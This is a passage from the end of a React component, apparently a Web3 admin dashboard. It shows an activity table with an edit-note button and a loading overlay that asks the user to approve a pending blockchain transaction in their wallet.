                              <span>{act.note || 'No note attached'}</span>
                            )}
                          </td>
                          <td className="px-4 py-3 text-right">
                            <button
                              onClick={() => {
                                setEditingId(act.id);
                                setEditingNote(act.note || '');
                              }}
                              className="p-1 text-[#00A3FF] hover:bg-[#00A3FF]/10 rounded transition-colors"
                              title="Edit Admin Note"
                            >
                              <Edit3 className="w-3.5 h-3.5" />
                            </button>
                          </td>
                        </tr>
                      );
                    })
                  )}
                </tbody>
              </table>
            </div>
          </div>
        </div>
      )}

      {/* Transaction Pending / Confirmation Loading Overlay */}
      {isPending && (
        <div className="fixed inset-0 z-50 bg-black/70 backdrop-blur-sm flex items-center justify-center p-4 animate-in fade-in duration-200">
          <div className="bg-card border border-border-main rounded-2xl p-6 max-w-sm w-full shadow-2xl text-center space-y-4">
            <div className="w-14 h-14 mx-auto rounded-full bg-[#00A3FF]/10 flex items-center justify-center">
              <RefreshCw className="w-7 h-7 text-[#00A3FF] animate-spin" />
            </div>
            <div className="space-y-1">
              <h3 className="text-base font-bold text-text-main">Awaiting Blockchain Confirmation</h3>
              <p className="text-xs text-text-secondary">
                Please check your Web3 wallet to approve the transaction. Waiting for on-chain inclusion...
              </p>
            </div>
            <div className="p-2.5 bg-input rounded-xl border border-border-main text-[11px] font-mono text-text-secondary">
              Status: Transaction Broadcast In-Flight
            </div>
          </div>
        </div>
      )}
    </div>
  );
}
